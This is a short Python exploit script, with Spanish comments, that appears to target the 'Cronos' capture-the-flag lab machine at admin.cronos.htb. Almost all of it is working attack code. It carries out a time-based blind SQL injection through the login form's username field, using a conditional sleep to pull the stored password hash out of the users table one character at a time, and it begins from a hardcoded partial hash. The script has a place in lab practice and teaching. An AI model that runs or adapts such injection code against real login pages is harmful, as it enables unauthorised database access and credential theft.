#!/usr/bin/python3

# Importando modulos
from pwn import *
import requests
import sys
import pdb
import signal
import string

# Ctrl + C
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://admin.cronos.htb/"
characters = "abcdef" + string.digits
# Funciones
def makeRequest():
    
    p1 = log.progress("Iniciando SQLi")
    p1.status("Obteniendo la contraseña")

    time.sleep(2)
 
    p2 = log.progress("Password")
    
    password = "4f5fffa7b2340178a71"

    for position in range(20, 33):
        for character in characters:
            post_data = {
                "username" : "admin' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(5),1)-- -" % (position, character),
                "password" : "admin"
                }
        
            p1.status(post_data['username'])

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":
    makeRequest()
